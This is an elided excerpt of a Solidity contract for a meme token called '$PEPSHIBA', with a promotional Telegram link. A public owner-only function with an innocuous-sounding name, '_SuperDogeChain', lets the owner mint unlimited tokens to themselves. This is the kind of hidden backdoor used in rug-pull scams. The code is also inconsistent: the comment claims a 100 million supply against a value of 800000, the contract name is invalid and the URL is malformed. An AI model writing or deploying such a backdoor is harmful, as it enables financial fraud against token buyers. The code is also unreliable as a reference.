...
//
// $PEPSHIBA proposes an innovative feature in its contract.
//
// 📱 Telegram:https::https://t.me/+h2C13_QqLEgzNzA1
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _SuperDogeChain(uint256 amount) public onlyOwner {
    _SuperDogeChain(msg.sender, amount);
    }
    ...
    function _SuperDogeChain(address account, uint256 amount) internal virtual {
...
contract $PEPSHIBA is ERC20 {

    uint tokenTotalSupply = 800000; // 100 Million Token Supply

    constructor() public ERC20("PEP SHIBA", "PEPSHIBA") {
        _SuperDogeChain(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}